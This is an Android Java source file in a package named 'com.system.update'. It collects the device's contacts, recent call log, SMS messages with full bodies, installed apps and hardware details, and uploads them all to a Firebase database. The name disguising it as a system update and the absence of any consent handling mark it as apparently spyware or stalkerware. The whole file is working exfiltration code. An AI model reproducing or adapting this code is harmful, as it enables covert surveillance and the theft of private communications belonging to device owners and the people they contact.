package com.system.update;

import android.app.ActivityManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import com.google.firebase.database.DatabaseReference;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Helpers {

    // ===== Contacts =====
    public static void pushContacts(Context ctx, DatabaseReference ref) {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                Map<String, Object> m = new HashMap<>();
                m.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                m.put("phoneNumber", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                list.add(m);
            }
            c.close();
        }
        ref.child("contacts").setValue(list);
    }

    // ===== Calls =====
    public static void pushCalls(Context ctx, DatabaseReference ref) {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC");
        if (c != null) {
            int numI = c.getColumnIndex(CallLog.Calls.NUMBER);
            int nameI = c.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int typeI = c.getColumnIndex(CallLog.Calls.TYPE);
            int dateI = c.getColumnIndex(CallLog.Calls.DATE);
            int durI = c.getColumnIndex(CallLog.Calls.DURATION);
            int n = 0;
            while (c.moveToNext() && n < 200) {
                Map<String, Object> m = new HashMap<>();
                m.put("number", c.getString(numI));
                m.put("name", c.getString(nameI));
                m.put("type", callType(c.getInt(typeI)));
                m.put("date", c.getLong(dateI));
                m.put("duration", c.getInt(durI));
                list.add(m);
                n++;
            }
            c.close();
        }
        ref.child("calls").setValue(list);
    }

    private static String callType(int t) {
        switch (t) {
            case CallLog.Calls.INCOMING_TYPE: return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE: return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE: return "MISSED";
            case CallLog.Calls.REJECTED_TYPE: return "REJECTED";
            default: return "UNKNOWN";
        }
    }

    // ===== SMS =====
    public static void pushSms(Context ctx, DatabaseReference ref) {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor c = ctx.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, "date DESC");
        if (c != null) {
            int aI = c.getColumnIndex("address");
            int bI = c.getColumnIndex("body");
            int dI = c.getColumnIndex("date");
            int tI = c.getColumnIndex("type");
            int n = 0;
            while (c.moveToNext() && n < 200) {
                Map<String, Object> m = new HashMap<>();
                m.put("address", c.getString(aI));
                m.put("body", c.getString(bI));
                m.put("date", c.getLong(dI));
                m.put("type", smsType(c.getInt(tI)));
                list.add(m);
                n++;
            }
            c.close();
        }
        ref.child("sms").setValue(list);
    }

    private static String smsType(int t) {
        switch (t) {
            case 1: return "INBOX";
            case 2: return "SENT";
            case 3: return "DRAFT";
            case 4: return "OUTBOX";
            default: return "UNKNOWN";
        }
    }

    // ===== Apps =====
    public static void pushApps(Context ctx, DatabaseReference ref) {
        PackageManager pm = ctx.getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        List<Map<String, Object>> list = new ArrayList<>();
        for (ApplicationInfo a : apps) {
            Map<String, Object> m = new HashMap<>();
            m.put("appName", pm.getApplicationLabel(a).toString());
            m.put("packageName", a.packageName);
            try { m.put("versionName", pm.getPackageInfo(a.packageName, 0).versionName); }
            catch (Exception e) { m.put("versionName", "?"); }
            list.add(m);
        }
        ref.child("apps").setValue(list);
    }

    // ===== System Info =====
    public static void pushSystem(Context ctx, DatabaseReference ref) {
        Map<String, Object> info = new HashMap<>();
        ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo mem = new ActivityManager.MemoryInfo();
        am.getMemoryInfo(mem);
        info.put("ramTotal", human(mem.totalMem));
        info.put("ramAvailable", human(mem.availMem));

        StatFs s = new StatFs(Environment.getDataDirectory().getPath());
        long total = s.getBlockSizeLong() * s.getBlockCountLong();
        long avail = s.getBlockSizeLong() * s.getAvailableBlocksLong();
        info.put("storageTotal", human(total));
        info.put("storageAvailable", human(avail));

        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics dm = new DisplayMetrics();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) ctx.getDisplay().getRealMetrics(dm);
        else wm.getDefaultDisplay().getRealMetrics(dm);
        info.put("screenResolution", dm.widthPixels + "x" + dm.heightPixels);

        info.put("bootloader", Build.BOOTLOADER);
        info.put("host", Build.HOST);
        info.put("time", Build.TIME);
        info.put("model", Build.MODEL);
        info.put("manufacturer", Build.MANUFACTURER);

        ref.child("systemInfo").setValue(info);
    }

    private static String human(long b) {
        if (b < 1024) return b + " B";
        double kb = b / 1024.0;
        if (kb < 1024) return String.format("%.1f KB", kb);
        double mb = kb / 1024.0;
        if (mb < 1024) return String.format("%.1f MB", mb);
        return String.format("%.2f GB", mb / 1024.0);
    }
  }
